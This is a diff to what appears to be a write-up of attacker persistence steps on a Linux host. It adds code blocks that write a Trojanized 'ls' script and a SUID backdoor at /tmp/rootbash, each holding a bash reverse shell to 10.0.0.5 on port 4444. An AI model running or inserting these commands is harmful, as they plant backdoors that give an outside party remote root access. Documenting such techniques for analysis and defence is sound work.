@@ -27,8 +27,22 @@ sudo systemctl start malicious.service
 
 2. Replaced the legitimate `ls` command with a Trojanized script located at `/home/baddog/.local/bin/ls`.
 - This Trojanized script was designed to execute a reverse shell when invoked, providing continued access to the system without raising suspicion.
+
+```
+echo '#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /home/baddog/.local/bin/ls
+chmod +x /home/baddog/.local/bin/ls
+```
+
 3. **Created a backdoor shell at `/tmp/rootbash`, set the **SUID permission** on the shell (`chmod u+s /tmp/rootbash`), and made it executable by any user.
 - This backdoor shell was designed to escalate privileges and grant root access, regardless of the user executing
+
+```
+echo '#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /tmp/rootbash
+chmod u+s /tmp/rootbash
+chmod +x /tmp/rootbash
+```
 
 ---
 
